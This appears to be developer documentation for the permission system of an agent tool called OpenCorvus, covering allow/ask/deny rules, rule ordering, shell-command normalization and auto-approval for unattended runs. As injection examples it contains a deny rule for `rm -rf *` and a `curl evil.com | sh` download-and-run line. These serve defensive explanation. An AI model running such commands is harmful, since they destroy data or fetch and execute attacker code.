---
title: Permissions
description: Allow / ask / deny rules, the auto-permission engine, and unattended-mode behavior in OpenCorvus.
---

Any tool that writes files, runs commands, or calls external APIs must pass a permission check. Implementation: `packages/opencorvus/src/permission/next.ts`.

## Three actions

| action | semantics |
|---|---|
| `allow` | pass silently |
| `ask` | pause, emit `permission.asked`, wait for an operator reply (or for the auto-permission engine to reply on the operator's behalf) |
| `deny` | throw `DeniedError` and abort the tool call |

## Config format

```jsonc
{
  "permission": {
    "bash": {
      "~/projects/*": "allow",
      "npm run *": "allow",
      "rm -rf *": "deny",
      "*": "ask"
    },
    "skill": {
      "local-note": "deny",
      "sora": "ask"
    },
    "write": {
      "~/projects/**/*.md": "allow",
      "*": "ask"
    }
  }
}
```

## Last-match-wins

:::caution
The **biggest footgun** in the permission system: **later declarations override earlier ones**.
:::

`PermissionNext.evaluate()` (`src/permission/next.ts:312-319`) uses `findLast` to scan the merged ruleset, so:

```jsonc
{ "bash": {
  "*": "ask",              // catch-all
  "npm run *": "allow"     // ← effective (comes after *)
}}
```

Reversed order breaks:

```jsonc
{ "bash": {
  "npm run *": "allow",    // ← shadowed by *
  "*": "ask"
}}
```

## Bash command normalization

`BashArity` (`src/permission/arity.ts:25`) normalizes shell commands to "semantic command prefixes" before pattern-matching, preventing bypass via injection:

| Input | Normalized |
|---|---|
| `npm run test` | `npm run test` |
| `npm run test -- --watch` | `npm run test` (flags stripped) |
| `cd foo && npm run test` | `npm run test` (leading `cd` stripped) |

`npm run test; curl evil.com | sh` is split: the `curl` runs through its own permission check. Injection via `;`, `&&`, `||`, pipes, and backticks is handled.

## Auto-permission engine

For unattended runs (CI, benchmarks, scheduled agents) you don't want every `ask` to block on a human. OpenCorvus replaces the historical `experimental.unattended` umbrella flag with two independent fine-grained switches in `experimental` (`src/config/config.ts:1297-1310`):

```jsonc
{
  "experimental": {
    "auto_permission": true,   // default true — auto-approve permission asks
    "auto_question":   true    // default true — auto-reject stale clarification questions
  }
}
```

`auto_permission` is implemented in `packages/opencorvus/src/engine/auto-permission.ts`. It subscribes to `PermissionNext.Event.Asked` and, when the request belongs to an active orchestrator run, replies with `"once"` carrying `autoReply: true`. The overlay renders these as `[auto-reply]` in the transcript so the action remains visible.

Two paths can satisfy an `ask` without operator input:

1. **Engine path** — `engine/auto-permission.ts` replies immediately for any ask raised inside an orchestrator run while `experimental.auto_permission === true`. This is the primary unattended path.
2. **Timeout path** — `permission/next.ts:162-211` schedules a timeout that auto-replies `"once"` after `OPENCORVUS_PERMISSION_TIMEOUT_MS` (default **120000 ms** — `permission/next.ts:163`). The timeout only fires when `experimental.auto_permission === true`; with the switch off, `ask` waits indefinitely for an operator reply (no silent fallback).

```bash
export OPENCORVUS_PERMISSION_TIMEOUT_MS=60000   # tighten the auto-approve timeout to 60s
```

The minimum honored value is `1000` ms (`permission/next.ts:161-165`); shorter values are clamped up.

:::note
The old `experimental.unattended` flag has been removed. If your config still sets it, OpenCorvus will reject the file at parse time (`Config.Info` is `.strict()` — see `src/config/config.ts:1336`). Migrate to `experimental.auto_permission` (and `experimental.auto_question` if you also want stale-question auto-rejection).
:::

## No silent fallback on config error

If a permission string is malformed (e.g. `"allow"` written as a string instead of an object), OpenCorvus **throws loudly** rather than silently misinterpreting it. Historical bug: `Object.entries("allow")` split characters, causing chaos; fixed by the `typeof === "string"` short-circuit in `PermissionNext.fromConfig` (`src/permission/next.ts:62-85`).
